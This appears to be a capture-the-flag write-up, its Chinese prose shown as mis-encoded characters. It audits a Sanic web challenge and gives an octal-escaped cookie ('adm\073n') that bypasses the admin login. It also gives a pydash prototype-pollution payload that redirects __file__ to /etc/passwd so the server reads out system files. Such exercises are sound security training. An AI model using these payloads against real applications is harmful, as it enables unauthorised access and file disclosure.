class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>â€‹åˆæ­¥å®¡ä¸€ä¸‹é€»è¾‘ï¼Œæœ‰ç”¨çš„ä¿¡æ¯å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br></pre></td></tr></table></figure><p>â€‹ä¸€çœ¼çœ‹ä¸Šå»æ²¡ä»€ä¹ˆï¼Œä½†æ˜¯å’Œä¸‹é¢è¿™ä¸ªç»“åˆèµ·æ¥å°±ä¸ä¸€æ ·äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br></pre></td></tr></table></figure><p>â€‹åœ¨ admin è¿™ä¸ªè·¯ç”±ä¸­ï¼Œå¯ä»¥æ¸…æ™°åœ°çœ‹åˆ° pydash.set_() å‡½æ•°ï¼Œç»“åˆä¸Šä¸€ä¸ªä¿¡æ¯ï¼Œåº”è¯¥æ˜¯æ‰“ python çš„åŸå‹é“¾æ±¡æŸ“ <code>__file__</code> æ¥è¯»æ–‡ä»¶ï¼Œé‚£ä¹ˆï¼Œè¿˜æœ‰ä¸ªè·¯ç”±éœ€è¦æ³¨æ„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå¯ä»¥å‘ç°çš„æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥ä¸€ä¸ª Cookie çš„å€¼ä¸º user=adm;n æ‰è¡Œï¼Œä½†æ˜¯ï¼Œè¯•è¿‡äº†ï¼Œä¸è¡Œï¼Œä¸ºå•¥å‘¢ï¼Ÿ</p><p><strong>æ³¨æ„ï¼šä»¥ä¸‹ä¸ºæˆ‘ä¸ªäººåˆ†ææ–¹å¼ï¼Œç”±äºæˆ‘æœ¬äººå¼‚å¸¸èœé¸¡ï¼Œæ‰€ä»¥å¾ˆæœ‰å¯èƒ½æ˜¯é”™è¯¯çš„ï¼Œä¸å¯ç›²ç›®ç›¸ä¿¡ã€‚</strong></p><p>â€‹ç„¶åæˆ‘ä»¬ç›¯ä½ <code>user = request.cookies.get(&quot;user&quot;)</code>  è¿™ä¸€è¡Œä»£ç ï¼Œå¯¹ç€ cookie åŒæ—¶æŒ‰ä½ ctrl + å·¦é”®ï¼Œæ‰¾åˆ°è¿™ä¸€è¡Œå†…å®¹ï¼Œè·Ÿè¿›ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/334caff31c114d5da4c4fd89b1523085.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å‘ç°å¦‚ä¸‹æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@property</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookies</span>(<span class="params">self</span>) -&gt; RequestParameters:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Incoming cookies on the request</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        RequestParameters: Incoming cookies on the request</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.parsed_cookies <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        self.get_cookies()</span><br><span class="line">    <span class="keyword">return</span> cast(CookieRequestParameters, self.parsed_cookies)</span><br></pre></td></tr></table></figure><p>â€‹è·Ÿè¿›  <code>get_cookies()</code> ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookies</span>(<span class="params">self</span>) -&gt; RequestParameters:</span><br><span class="line">    cookie = self.headers.getone(<span class="string">&quot;cookie&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    self.parsed_cookies = CookieRequestParameters(parse_cookie(cookie))</span><br><span class="line">    <span class="keyword">return</span> self.parsed_cookies</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå®¡è¿‡å‰é¢é‚£ä¸ªå¯¹è±¡ï¼Œé‡è¦ç¨‹åº¦æ²¡æœ‰å†è·Ÿè¿› <code>parse_cookie(cookie)</code>  é«˜ï¼Œæ‰€ä»¥è·Ÿè¿› <code>parse_cookie(cookie)</code> ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">parse_cookie</span>(<span class="params">raw: <span class="built_in">str</span></span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">List</span>[<span class="built_in">str</span>]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Parses a raw cookie string into a dictionary.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The function takes a raw cookie string (usually from HTTP headers) and</span></span><br><span class="line"><span class="string">    returns a dictionary where each key is a cookie name and the value is a</span></span><br><span class="line"><span class="string">    list of values for that cookie. The function handles quoted values and</span></span><br><span class="line"><span class="string">    skips invalid cookie names.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        raw (str): The raw cookie string to be parsed.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        Dict[str, List[str]]: A dictionary containing the cookie names as keys</span></span><br><span class="line"><span class="string">        and a list of values for each cookie.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string">        ```python</span></span><br><span class="line"><span class="string">        raw = &#x27;name1=value1; name2=&quot;value2&quot;; name3=value3&#x27;</span></span><br><span class="line"><span class="string">        cookies = parse_cookie(raw)</span></span><br><span class="line"><span class="string">        # cookies will be &#123;&#x27;name1&#x27;: [&#x27;value1&#x27;], &#x27;name2&#x27;: [&#x27;value2&#x27;], &#x27;name3&#x27;: [&#x27;value3&#x27;]&#125;</span></span><br></pre></td></tr></table></figure><pre><code>&quot;&quot;&quot;  # noqa: E501cookies: Dict[str, List[str]] = &#123;&#125;for token in raw.split(&quot;;&quot;):    name, sep, value = token.partition(&quot;=&quot;)    name = name.strip()    value = value.strip()    # Support cookies =value or plain value with no name    # https://github.com/httpwg/http-extensions/issues/159    if not sep:        if not name:            # Empty value like ;; or a cookie header with no value            continue        name, value = &quot;&quot;, name    if COOKIE_NAME_RESERVED_CHARS.search(name):  # no cov        continue    if len(value) &gt; 2 and value[0] == '&quot;' and value[-1] == '&quot;':  # no cov        value = _unquote(value)    if name in cookies:        cookies[name].append(value)    else:        cookies[name] = [value]return cookies</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">â€‹è¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼š</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"> for token in raw.split(&quot;;&quot;):</span><br><span class="line">        name, sep, value = token.partition(&quot;=&quot;)</span><br><span class="line">        name = name.strip()</span><br><span class="line">        value = value.strip()</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªä»£ç å¾ˆæ˜¾ç„¶æ˜¯å°†åˆ†å·å‰ååˆ†å‰²æˆäº†ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æƒ³è¦è¾“å…¥çš„ Cookie: user=adm;n ä¼šå˜æˆ user=adm ä»¥åŠ n è¿™ä¸¤ä¸ªä¸²ã€‚</p><p>â€‹æ ¹æ®è¿™å‡ è¡Œï¼Œå¤§æ¦‚å¯ä»¥å‘ç°æœ€åè¿”å›çš„å†…å®¹å’Œä»€ä¹ˆæœ‰å…³äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(value) &gt; <span class="number">2</span> <span class="keyword">and</span> value[<span class="number">0</span>] == <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">and</span> value[-<span class="number">1</span>] == <span class="string">&#x27;&quot;&#x27;</span>:  <span class="comment"># no cov</span></span><br><span class="line">        value = _unquote(value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">in</span> cookies:</span><br><span class="line">        cookies[name].append(value)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cookies[name] = [value]</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> cookies</span><br></pre></td></tr></table></figure><p>â€‹å¾ˆæ˜æ˜¾ï¼Œæœ€ç»ˆè¿”å›çš„æ˜¯ cookies ï¼Œä½†æ˜¯æ¯æ¬¡æ“ä½œ cookies éƒ½æ˜¯å¢åŠ çš„ value å‚æ•°ï¼Œç”±æ­¤ï¼Œæ ¹æ®  <code>value = _unquote(value)</code> ï¼Œè¿™é‡Œè·Ÿè¿› <code>_unquote(value)</code> ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_unquote</span>(<span class="params"><span class="built_in">str</span></span>):  <span class="comment"># no cov</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="built_in">len</span>(<span class="built_in">str</span>) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>[<span class="number">0</span>] != <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">or</span> <span class="built_in">str</span>[-<span class="number">1</span>] != <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">str</span> = <span class="built_in">str</span>[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    n = <span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt;= i &lt; n:</span><br><span class="line">        o_match = OCTAL_PATTERN.search(<span class="built_in">str</span>, i)</span><br><span class="line">        q_match = QUOTE_PATTERN.search(<span class="built_in">str</span>, i)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> o_match <span class="keyword">and</span> <span class="keyword">not</span> q_match:</span><br><span class="line">            res.append(<span class="built_in">str</span>[i:])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        j = k = -<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> o_match:</span><br><span class="line">            j = o_match.start(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> q_match:</span><br><span class="line">            k = q_match.start(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> q_match <span class="keyword">and</span> (<span class="keyword">not</span> o_match <span class="keyword">or</span> k &lt; j):</span><br><span class="line">            res.append(<span class="built_in">str</span>[i:k])</span><br><span class="line">            res.append(<span class="built_in">str</span>[k + <span class="number">1</span>])</span><br><span class="line">            i = k + <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res.append(<span class="built_in">str</span>[i:j])</span><br><span class="line">            res.append(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>[j + <span class="number">1</span> : j + <span class="number">4</span>], <span class="number">8</span>)))  <span class="comment"># noqa: E203</span></span><br><span class="line">            i = j + <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(res)</span><br></pre></td></tr></table></figure><p>â€‹æ„Ÿè§‰ï¼Œè¿™ä¸ªå°±æ˜¯æˆ‘ä»¬æœ€ä¸»è¦çš„åˆ©ç”¨çš„ç‚¹ã€‚</p><p>â€‹é¦–å…ˆæ˜¯è¿™å‡ è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="built_in">len</span>(<span class="built_in">str</span>) &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">str</span>[<span class="number">0</span>] != <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">or</span> <span class="built_in">str</span>[-<span class="number">1</span>] != <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="built_in">str</span>[<span class="number">1</span>:-<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>â€‹åˆ¤æ–­ä¼ å…¥çš„å­—ç¬¦ä¸²ï¼ˆè¿™é‡Œæ¨æµ‹æ˜¯ user=XXXX ä¸­çš„ XXXXï¼‰ï¼Œå‘ç°å¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦ä¸æ˜¯ä¸¤ç§å¼•å·ï¼Œåˆ™ç›´æ¥è¿”å›ï¼Œå¦‚æœæ˜¯å¼•å·ï¼Œåˆ™æå¤´å»å°¾ï¼ŒæŠŠå¼•å·å»æ‰ã€‚ä¹‹åçš„ä»£ç æˆ‘ä¸å¤§ä¼šå®¡ï¼Œè·‘å»é—®äº†ä¸‹ AIï¼Œå¯èƒ½æœ‰ç‚¹å„¿æ™ºéšœï¼Œä¸è¿‡ç»™äº†æˆ‘ä¸€ä¸ªæ–¹å‘ï¼Œæµ‹è¯•äº†ä¸€ä¸‹ï¼Œèƒ½æˆï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line">n = <span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">while</span> <span class="number">0</span> &lt;= i &lt; n:</span><br><span class="line">    o_match = OCTAL_PATTERN.search(<span class="built_in">str</span>, i)</span><br><span class="line">    q_match = QUOTE_PATTERN.search(<span class="built_in">str</span>, i)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> o_match <span class="keyword">and</span> <span class="keyword">not</span> q_match:</span><br><span class="line">        res.append(<span class="built_in">str</span>[i:])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># else:</span></span><br><span class="line">    j = k = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> o_match:</span><br><span class="line">        j = o_match.start(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> q_match:</span><br><span class="line">        k = q_match.start(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> q_match <span class="keyword">and</span> (<span class="keyword">not</span> o_match <span class="keyword">or</span> k &lt; j):</span><br><span class="line">        res.append(<span class="built_in">str</span>[i:k])</span><br><span class="line">        res.append(<span class="built_in">str</span>[k + <span class="number">1</span>])</span><br><span class="line">        i = k + <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res.append(<span class="built_in">str</span>[i:j])</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>[j + <span class="number">1</span> : j + <span class="number">4</span>], <span class="number">8</span>)))  <span class="comment"># noqa: E203</span></span><br><span class="line">        i = j + <span class="number">4</span></span><br></pre></td></tr></table></figure><p><img data-src="https://i-blog.csdnimg.cn/direct/b7ed96c33d6c4f9fa6d71c7b2a5a49d5.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹åé¢è¿˜ç»™äº†ä¸ªå®ƒç»™å†™çš„æ”¹è¿›çš„ä»£ç ï¼Œä¸è¿‡å°±ä¸æ”¾è¿™å„¿äº†ã€‚</p><p>â€‹æ ¹æ®è¿™ä¸ªç­”æ¡ˆçŒœæƒ³ï¼Œå¯èƒ½æ˜¯é€šè¿‡å…«è¿›åˆ¶è¿›è¡Œçš„ç»•è¿‡ï¼Œæµ‹è¯•ä¸€ä¸‹ï¼Œè®¿é—®ä¸‹ login è·¯ç”±ï¼Œç„¶åä¿®æ”¹ cookie çš„å€¼ä¸º <code>Cookie: user=&quot;adm\073n&quot;</code> ï¼Œä¹‹åè¯•è¯•çœ‹èƒ½å¦ç™»é™†æˆåŠŸï¼Ÿ</p><p><img data-src="https://i-blog.csdnimg.cn/direct/545cfa811fea45829bf35e9fb54f09c0.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æˆåŠŸäº† <strong>(â‰§â–½â‰¦)o</strong>ã€‚</p><p>â€‹è¿™é‡Œå®ƒè¿”å›äº†ä¸ª Session å€¼ï¼Œç„¶åå°†å®ƒç»™çš„ Session å€¼å†™åˆ°è¯·æ±‚å¤´å†…ï¼Œç„¶åè®¿é—® admin è·¯ç”±ï¼Œå‘ç°å¹¶æ²¡æœ‰ ç»™æˆ‘ä»¬ç›´æ¥ forbidden æ‰ï¼Œè¯´æ˜æˆåŠŸäº†ã€‚ä¹‹åå°±æ˜¯æ­£å„¿å…«ç»çš„åŸå‹é“¾æ±¡æŸ“è¯»æ–‡ä»¶äº†ï¼Œç¬¬ä¸€æ³¢ï¼Œå…ˆè¯»ä¸€ä¸‹ï¼Œå…ˆæ¥ä¸ªç¬¬ä¸€ä¸ª payloadï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;key&quot;</span>  <span class="punctuation">:</span> <span class="string">&quot;__init__.__globals__.__file__&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;value&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹ç„¶è€Œï¼Œæ­å–œäº†ï¼Œæ¯è¿‡ï¼Œè¢« forbidden äº†ã€‚å›å»çœ‹çœ‹ï¼Œç ´æ¡ˆäº†ï¼Œadmin è·¯ç”±å‡½æ•°ä¸­å­˜åœ¨è¿™ä¹ˆä¸€ä¸ªæ¯”è¾ƒï¼š <code>if key and value and type(key) is str and '_.' not in key:</code> ï¼Œè¿™ä¸ªå°±å¡ä½æˆ‘äº†ã€‚å…ˆæ¥çœ‹ä¸‹è¿™å‡ è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">    pollute = Pollute()</span><br><span class="line">    pydash.set_(pollute, key, value)</span><br></pre></td></tr></table></figure><p>â€‹ä¼¼ä¹éœ€è¦ç»•è¿‡çš„ä»…ä»…åªæœ‰ key ä¸­çš„  <code>'_.'</code>  å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆï¼Œéœ€è¦çš„å°±æ˜¯å¯¹ key è¿›è¡Œæ“ä½œçš„åœ°æ–¹åº”è¯¥é‡ç‚¹è§‚å¯Ÿï¼Œæ‰€ä»¥ï¼Œä¸Šé¢è¿™ä¸ªä»£ç åº”è¯¥é‡ç‚¹çœ‹ä¸€çœ‹ï¼Œå½“ç„¶ï¼Œ å‰é¢çš„æ‰€æœ‰éƒ½æ²¡æœ‰ç”¨ï¼Œæœ€æœ‰ç”¨çš„åªæœ‰ <code>pydash.set_(pollute, key, value)</code> ï¼Œé‚£ä¹ˆï¼Œæ²¡åŠæ³•äº†ï¼Œè·Ÿè¿› set_() å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_</span>(<span class="params">obj, path, value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Sets the value of an object described by `path`. If any part of the object path doesn&#x27;t exist,</span></span><br><span class="line"><span class="string">    it will be created.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str | list): Target path to set value to.</span></span><br><span class="line"><span class="string">        value (mixed): Value to set.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Modified `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.b.c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: &#123;&#x27;c&#x27;: 1&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.0.c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;0&#x27;: &#123;&#x27;c&#x27;: 1&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_([1, 2], &#x27;[2][0]&#x27;, 1)</span></span><br><span class="line"><span class="string">        [1, 2, [1]]</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.b[0].c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: [&#123;&#x27;c&#x27;: 1&#125;]&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 2.2.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 3.3.0</span></span><br><span class="line"><span class="string">        Added :func:`set_` as main definition and :func:`deep_set` as alias.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 4.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        - Modify `obj` in place.</span></span><br><span class="line"><span class="string">        - Support creating default path values as ``list`` or ``dict`` based on whether key or index</span></span><br><span class="line"><span class="string">          substrings are used.</span></span><br><span class="line"><span class="string">        - Remove alias ``deep_set``.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> set_with(obj, path, 